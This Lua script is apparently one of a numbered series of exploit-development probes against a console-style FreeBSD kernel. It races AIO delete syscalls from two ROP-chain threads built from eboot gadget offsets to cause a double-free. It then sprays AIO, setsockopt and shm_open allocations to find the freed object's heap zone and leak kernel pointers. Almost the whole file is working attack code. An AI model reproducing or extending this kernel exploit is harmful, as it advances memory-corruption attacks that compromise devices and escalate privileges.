-- CRASH_CLASS: MODERATE
-- PROBE 68c: AIO overlap exploit via setsockopt controlled-size spray
--
-- Key insight from 67d/67e: AIO-on-AIO overlap doesn't change 663 status
-- because new AIO writes the same value at the same offset. We need a
-- DIFFERENT object type at the freed address.
--
-- This probe systematically tests which allocation size matches the AIO
-- tracking structure's UMA zone by:
--   1) Triggering the double-free
--   2) For each candidate size (32,48,64,80,96,128): spray with setsockopt
--      allocations of that size, then check 663 for status corruption
--   3) The size that corrupts 663 status tells us the zone
--
-- Also tests: forced UMA cache drain between spray phases, and
-- getsockopt readback on corrupted sockets for kernel pointer leak.
--
-- The critical test is whether setsockopt(SO_LINGER) or TCP options
-- allocate from zone-48/64 and overlap with the freed AIO struct.

print("=== PROBE 68c: setsockopt controlled-size spray ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt_q(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- AIO helpers
local reqs_b = memory.alloc(0x30)
local dbuf = memory.alloc(0x4000)
local rbuf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end
local function query_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    pcall(function() mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEADDEAD
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD
end

-- =========================================================
-- Helper: do one double-free + AIO spray + overlap verify cycle
-- Returns: table of surviving partner IDs (even-indexed spray entries)
-- =========================================================
local function do_race_and_spray()
    -- Double-free race
    local BATCH = 16
    local del_ids_loc = memory.alloc(4 * BATCH + 0x10)
    local sts_A_loc = memory.alloc(4 * BATCH + 0x10)
    local sts_B_loc = memory.alloc(4 * BATCH + 0x10)
    local mk_A_loc = memory.alloc(8)
    local mk_B_loc = memory.alloc(8)

    local tdbl = 0
    for iter = 1, 20 do
        if not alive() then return nil end
        local ids = {}
        for i = 1, BATCH do
            local id = submit_one()
            if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
        end
        if #ids == 0 then break end
        local cnt = #ids
        for i = 0, cnt - 1 do
            wd(N(del_ids_loc) + i * 4, ids[i + 1])
            wd(N(sts_A_loc) + i * 4, 0xAA)
            wd(N(sts_B_loc) + i * 4, 0xBB)
        end
        wq(N(mk_A_loc), uint64(0)); wq(N(mk_B_loc), uint64(0))

        local stk_A = memory.alloc(0x4000)
        local sb_A = N(stk_A)
        local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
        local oA = 0
        local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
        emA(g_pop_rax); emA(uint64(0x41))
        emA(g_pop_rdi); emA(uint64(N(mk_A_loc)))
        emA(g_mov_m_rax)
        emA(g_pop_rdi); emA(uint64(N(del_ids_loc)))
        emA(g_pop_rsi); emA(uint64(cnt))
        emA(g_pop_rdx); emA(uint64(N(sts_A_loc)))
        emA(g_pop_rax); emA(uint64(662))
        emA(stub)
        emA(g_pop_rdi); emA(uint64(0))
        emA(g_pop_rax); emA(uint64(431)); emA(stub)

        local stk_B = memory.alloc(0x4000)
        local sb_B = N(stk_B)
        local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
        local oB = 0
        local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
        emB(g_pop_rax); emB(uint64(0x42))
        emB(g_pop_rdi); emB(uint64(N(mk_B_loc)))
        emB(g_mov_m_rax)
        emB(g_pop_rdi); emB(uint64(N(del_ids_loc)))
        emB(g_pop_rsi); emB(uint64(cnt))
        emB(g_pop_rdx); emB(uint64(N(sts_B_loc)))
        emB(g_pop_rax); emB(uint64(662))
        emB(stub)
        emB(g_pop_rdi); emB(uint64(0))
        emB(g_pop_rax); emB(uint64(431)); emB(stub)

        local par_A = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
        wq(N(par_A), g_bare_ret)
        wq(N(par_A) + 0x10, uint64(sb_A))
        wq(N(par_A) + 0x18, uint64(0x2000))
        local tA = memory.alloc(8); wq(N(tA), uint64(0))
        wq(N(par_A) + 0x30, tA)

        local par_B = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
        wq(N(par_B), g_bare_ret)
        wq(N(par_B) + 0x10, uint64(sb_B))
        wq(N(par_B) + 0x18, uint64(0x2000))
        local tB = memory.alloc(8); wq(N(tB), uint64(0))
        wq(N(par_B) + 0x30, tB)

        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)
        for w = 1, 50000 do local _ = rd(sb_A) end

        local dbl = 0
        for i = 0, cnt - 1 do
            if (rd(N(sts_A_loc) + i * 4) or 1) == 0 and (rd(N(sts_B_loc) + i * 4) or 1) == 0 then
                dbl = dbl + 1
            end
        end
        tdbl = tdbl + dbl
    end
    print("  doubles=" .. tdbl)
    if tdbl < 2 or not alive() then return nil end

    -- AIO spray
    local sp = {}
    for i = 1, 128 do
        local id = submit_one()
        if id ~= 0 then sp[#sp + 1] = id end
    end

    -- Overlap verify via poll-flag cross-contamination
    for i = 1, #sp, 2 do poll_one(sp[i]) end
    local ov = 0
    for i = 2, #sp, 2 do
        if query_663(sp[i]) == 0x00010003 then ov = ov + 1 end
    end
    print("  spray=" .. #sp .. " overlap=" .. ov)
    if ov < 4 then return nil end

    -- Record baseline
    local base = {}
    local survivors = {}
    for i = 2, #sp, 2 do
        base[i] = query_663(sp[i])
        survivors[#survivors + 1] = {id = sp[i], baseline = base[i]}
    end

    -- Delete first partners (frees shared structures)
    for i = 1, #sp, 2 do
        poll_one(sp[i])
        delete_one(sp[i])
    end

    return survivors
end

-- =========================================================
-- [A] SETUP: RACE + SPRAY + OVERLAP
-- =========================================================
print("")
print("[A] Double-free + overlap setup")
local survivors = do_race_and_spray()
if not survivors or #survivors == 0 then
    print("  FAILED: no overlap")
    print("=== 68c DONE ===")
    return
end
print("  survivors=" .. #survivors)

-- =========================================================
-- [B] SIZE SWEEP: setsockopt with increasing allocation sizes
-- =========================================================
print("")
print("[B] Size sweep: which allocation size matches the AIO zone?")

local candidate_sizes = {16, 32, 48, 64, 80, 96, 128}
local SPRAY_PER_SIZE = 64

for _, test_sz in ipairs(candidate_sizes) do
    if not alive() then break end

    -- Create sockets and set options with data of test_sz bytes
    local test_fds = {}
    local set_count = 0
    for i = 1, SPRAY_PER_SIZE do
        if not alive() then break end
        -- Create UDP socket
        local ok, ret = pcall(function()
            return mk(97)(uint64(2), uint64(2), uint64(17))
        end)
        if ok and sgn(ret) >= 0 then
            local fd = sgn(ret)
            test_fds[#test_fds + 1] = fd

            -- setsockopt(fd, SOL_SOCKET, SO_LABEL, buf, test_sz)
            -- SO_LABEL=0x1009 (Mac framework label, may allocate)
            -- Also try IP_OPTIONS=1 for sizes <=44
            local opt_buf = memory.alloc(test_sz + 8)
            for off = 0, test_sz - 1, 4 do
                wd(N(opt_buf) + off, 0xDEADBEEF)
            end

            -- Try SO_LABEL first (0x1009)
            local ok2, ret2 = pcall(function()
                mk(105)(uint64(fd), uint64(0xFFFF), uint64(0x1009),
                    uint64(N(opt_buf)), uint64(test_sz))
            end)
            if ok2 and sgn(ret2) == 0 then
                set_count = set_count + 1
            end

            -- Also try IP_OPTIONS (1) for sizes <=44
            if test_sz <= 44 then
                pcall(function()
                    mk(105)(uint64(fd), uint64(0), uint64(1),
                        uint64(N(opt_buf)), uint64(test_sz))
                end)
            end

            -- Try TCP_CONGESTION (64) — sets a string copy
            if test_sz >= 4 and test_sz <= 64 then
                -- Need TCP socket for TCP options
                local ok3, ret3 = pcall(function()
                    return mk(97)(uint64(2), uint64(1), uint64(6))
                end)
                if ok3 and sgn(ret3) >= 0 then
                    local tcp_fd = sgn(ret3)
                    test_fds[#test_fds + 1] = tcp_fd
                    pcall(function()
                        mk(105)(uint64(tcp_fd), uint64(6), uint64(64),
                            uint64(N(opt_buf)), uint64(test_sz))
                    end)
                end
            end
        end
    end

    -- Check survivors for status corruption
    local corrupted = 0
    for _, s in ipairs(survivors) do
        if not alive() then break end
        local st = query_663(s.id)
        if st ~= s.baseline then corrupted = corrupted + 1 end
    end

    print(string.format("  sz=%3d: fds=%d set=%d corrupted=%d/%d",
        test_sz, #test_fds, set_count, corrupted, #survivors))

    if corrupted > 0 then
        print("  *** ZONE MATCH at size " .. test_sz .. " ***")
        -- Dump the corrupted values
        for _, s in ipairs(survivors) do
            local st = query_663(s.id)
            if st ~= s.baseline then
                print(string.format("    id=%d: %08X -> %08X", s.id, s.baseline, st))
                -- Check for kernel pointer
                if st >= 0xFFFF8000 and st < 0xFFFFFFFF then
                    print("    *** POSSIBLE KERNEL POINTER ***")
                end
            end
        end
    end

    -- Close test sockets (frees the setsockopt allocations)
    for _, fd in ipairs(test_fds) do
        pcall(function() mk(6)(uint64(fd)) end)
    end
end

-- =========================================================
-- [C] ALTERNATIVE: shm_open metadata spray
-- =========================================================
print("")
print("[C] shm_open metadata spray")
if alive() then
    local shm_fds = {}
    for i = 1, 64 do
        if not alive() then break end
        local name = put_str(string.format("/shm_%04d", i))
        local ok, ret = pcall(function()
            return mk(482)(uint64(N(name)), uint64(0x202), uint64(0x1FF))
        end)
        if ok and sgn(ret) >= 0 then shm_fds[#shm_fds + 1] = sgn(ret) end
    end
    print("  shm_objects=" .. #shm_fds)

    -- Check survivors again
    local shm_corrupted = 0
    for _, s in ipairs(survivors) do
        if not alive() then break end
        local st = query_663(s.id)
        if st ~= s.baseline then shm_corrupted = shm_corrupted + 1 end
    end
    print("  corrupted_after_shm=" .. shm_corrupted)

    -- Cleanup shm
    for _, fd in ipairs(shm_fds) do
        pcall(function() mk(6)(uint64(fd)) end)
    end
end

-- =========================================================
-- [D] MASSIVE CHURN: allocate+free 1000+ AIO to drain UMA caches
-- =========================================================
print("")
print("[D] UMA cache drain: 1000 AIO churn cycles")
if alive() then
    for round = 1, 8 do
        if not alive() then break end
        local churn_ids = {}
        for i = 1, 128 do
            local id = submit_one()
            if id ~= 0 then churn_ids[#churn_ids + 1] = id end
        end
        for _, id in ipairs(churn_ids) do poll_one(id) end
        for _, id in ipairs(churn_ids) do delete_one(id) end
    end
    print("  churned 1024 AIO objects")

    -- Now re-spray with controlled data setsockopt
    local post_fds = {}
    for i = 1, 128 do
        if not alive() then break end
        local ok, ret = pcall(function()
            return mk(97)(uint64(2), uint64(2), uint64(17))
        end)
        if ok and sgn(ret) >= 0 then
            local fd = sgn(ret)
            post_fds[#post_fds + 1] = fd
            -- setsockopt with 48-byte pattern
            local opt = memory.alloc(48)
            for off = 0, 44, 4 do wd(N(opt) + off, 0xBAADF00D) end
            pcall(function()
                mk(105)(uint64(fd), uint64(0), uint64(1),
                    uint64(N(opt)), uint64(44))
            end)
        end
    end

    -- Check survivors
    local post_corrupted = 0
    local post_anomalies = {}
    for _, s in ipairs(survivors) do
        if not alive() then break end
        local st = query_663(s.id)
        if st ~= s.baseline then
            post_corrupted = post_corrupted + 1
            post_anomalies[#post_anomalies + 1] = string.format(
                "id=%d: %08X->%08X", s.id, s.baseline, st)
        end
    end
    print("  post_drain_corrupted=" .. post_corrupted)
    if #post_anomalies > 0 then
        for j = 1, math.min(10, #post_anomalies) do
            print("    " .. post_anomalies[j])
        end
    end

    -- Cleanup
    for _, fd in ipairs(post_fds) do
        pcall(function() mk(6)(uint64(fd)) end)
    end
end

-- =========================================================
-- [E] DIRECT OVERLAP PROOF: submit AIO with different fd
-- =========================================================
print("")
print("[E] AIO-on-AIO with different fd (status field discrimination)")
if alive() then
    -- If 663 status field contains fd or something derived from the request,
    -- a new AIO with a different fd should show a different value via the survivor

    -- Submit 128 new AIO with /dev/rng instead of /dev/zero
    local fd_rng = sgn(mk(5)(put_str("/dev/rng"), uint64(0), uint64(0)))
    print("  fd_rng=" .. fd_rng)

    if fd_rng >= 0 then
        local new_ids = {}
        for i = 1, 128 do
            local new_reqs = memory.alloc(0x30)
            wq(N(new_reqs), uint64(0))
            wq(N(new_reqs) + 8, uint64(64))  -- different size
            local bh, bl = get_hi_lo(uint64(N(dbuf)))
            wd(N(new_reqs) + 0x10, bl); wd(N(new_reqs) + 0x14, bh)
            local rh, rl = get_hi_lo(uint64(N(rbuf)))
            wd(N(new_reqs) + 0x18, rl); wd(N(new_reqs) + 0x1C, rh)
            wd(N(new_reqs) + 0x20, fd_rng); wd(N(new_reqs) + 0x24, 0)
            wd(N(one_id), 0)
            pcall(function()
                mk(669)(uint64(1), uint64(N(new_reqs)), uint64(1), uint64(1), uint64(N(one_id)))
            end)
            local nid = rd(N(one_id)) or 0
            if nid ~= 0 then new_ids[#new_ids + 1] = nid end
        end
        print("  rng_requests=" .. #new_ids)

        -- Check if survivor status changed
        local rng_changed = 0
        for idx = 1, math.min(10, #survivors) do
            local s = survivors[idx]
            if not alive() then break end
            local st = query_663(s.id)
            if st ~= s.baseline then
                rng_changed = rng_changed + 1
                print(string.format("    id=%d: %08X->%08X", s.id, s.baseline, st))
            end
        end
        print("  rng_changed=" .. rng_changed)

        -- Cleanup
        for _, id in ipairs(new_ids) do
            poll_one(id)
            delete_one(id)
        end
        pcall(function() mk(6)(uint64(fd_rng)) end)
    end
end

-- =========================================================
-- [F] CLEANUP
-- =========================================================
if alive() then
    print("")
    print("[F] Cleanup")
    for _, s in ipairs(survivors) do
        poll_one(s.id)
        delete_one(s.id)
    end
    print("  done")
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 68c COMPLETE ===")
